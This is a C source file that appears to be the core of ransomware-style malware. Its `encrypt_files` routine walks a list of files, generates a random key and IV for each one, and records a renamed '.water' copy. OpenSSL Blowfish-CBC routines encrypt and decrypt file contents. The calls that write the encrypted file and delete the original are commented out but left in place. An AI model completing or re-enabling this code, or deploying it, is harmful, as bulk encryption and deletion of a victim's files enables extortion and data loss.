#include"crypto.h"
#include"struct.h"
#include"func.h"
#include"func.h"
#include<stdio.h>
#include<stdlib.h>
#include<openssl/evp.h>
#include<openssl/aes.h>


/**
 * This function will walk throught all files on the files(List) and try to open
 * it, if success, generate random key and iv, for each file on the list.
 * Call the encrypt function to encrypt the file.
 * After encryption, the path, key and iv will be added to the encrypted(EncList)
 * If not success opening the file, the path will be added to the not_encrypted
 * (List).
 * @param files -> type = List
 * @param encrypted -> type = EncList
 * @param not_encrypted -> type = List
 */
void encrypt_files(List *files, List **encrypted, List **not_encrypted){
    int status;
    FILE *old, *new;
    char* new_name;
    char *iv;
    char *key;
    while(files != NULL){

        old = fopen(files->info[2], "rb");
        if(old != NULL){
            new_name = (char*) malloc(strlen(files->info[2]) + strlen(".water") + 2);
            strcpy(new_name, files->info[2]);
            strcat(new_name, ".water");
            //new = fopen(new_name, "wb");

            iv = generate_key(16);
            key = generate_key(32);


            //encrypt(old, new, key, iv);
            append(encrypted, new_name, key, iv);
            //fclose(new);
            fclose(old);
            free(key);
            free(iv);
            //remove(files->path); // delete the original file

        }else    append(not_encrypted, files->info[2], NULL, NULL);

        files = files->prox;
    }
}

/**
 * This function will encrypt the content from file and save on the out (FILE).
 * @param in -> type = FILE
 * @param out -> type = FILE
 * @param key -> type = char * (String)
 * @param iv -> type = char * (String)
 */
void encrypt(FILE *in, FILE *out, char *key, char *iv){
    int chunk_size = 512;
    unsigned char inbuf[chunk_size];
    unsigned char outbuf[chunk_size + EVP_MAX_BLOCK_LENGTH];
    int inlen;
    int outlen;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

    EVP_CIPHER_CTX_init(ctx);
    EVP_CipherInit_ex(ctx, EVP_bf_cbc(), NULL, NULL, NULL, 1); // 1 encrypt - 0 decrypt
    EVP_CIPHER_CTX_set_key_length(ctx, 16);
    EVP_CipherInit_ex(ctx, NULL, NULL, key, iv, 1);
    while(1){
        inlen = fread(inbuf, 1, chunk_size, in);
        if(inlen <= 0)   break;
        if(!EVP_CipherUpdate(ctx, outbuf, &outlen, inbuf, inlen)){
            /* Error */
            EVP_CIPHER_CTX_cleanup(ctx);
            return;
        }
        fwrite(outbuf, 1, outlen, out);
    }
    if(!EVP_CipherFinal_ex(ctx, outbuf, &outlen))
    {
        /* Error */
        EVP_CIPHER_CTX_cleanup(ctx);
        return;
    }
    fwrite(outbuf, 1, outlen, out);
    EVP_CIPHER_CTX_cleanup(ctx);
    rewind(in);
    rewind(out);
}

/**
 * This function will decrypt the content from encrypted file and save on the
 * out (FILE).
 * @param in -> type = FILE
 * @param out -> type = FILE
 * @param key -> type = char * (String)
 * @param iv -> type = char * (String)
 */
void decrypt(FILE *in, FILE *out, char *key, char *iv){
int chunk_size = 512;
    unsigned char inbuf[chunk_size];
    unsigned char outbuf[chunk_size + EVP_MAX_BLOCK_LENGTH];
    int inlen;
    int outlen;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

    EVP_CIPHER_CTX_init(ctx);
    EVP_CipherInit_ex(ctx, EVP_bf_cbc(), NULL, NULL, NULL, 0); // 1 encrypt - 0 decrypt
    EVP_CIPHER_CTX_set_key_length(ctx, 16);
    EVP_CipherInit_ex(ctx, NULL, NULL, key, iv, 0);
    while(1){
        inlen = fread(inbuf, 1, chunk_size, in);
        if(inlen <= 0)   break;
        if(!EVP_CipherUpdate(ctx, outbuf, &outlen, inbuf, inlen)){
            /* Error */
            EVP_CIPHER_CTX_cleanup(ctx);
            return;
        }
        fwrite(outbuf, 1, outlen, out);
    }
    if(!EVP_CipherFinal_ex(ctx, outbuf, &outlen))
    {
        /* Error */
        EVP_CIPHER_CTX_cleanup(ctx);
        return;
    }
    fwrite(outbuf, 1, outlen, out);
    EVP_CIPHER_CTX_cleanup(ctx);
    rewind(in);
    rewind(out);
}
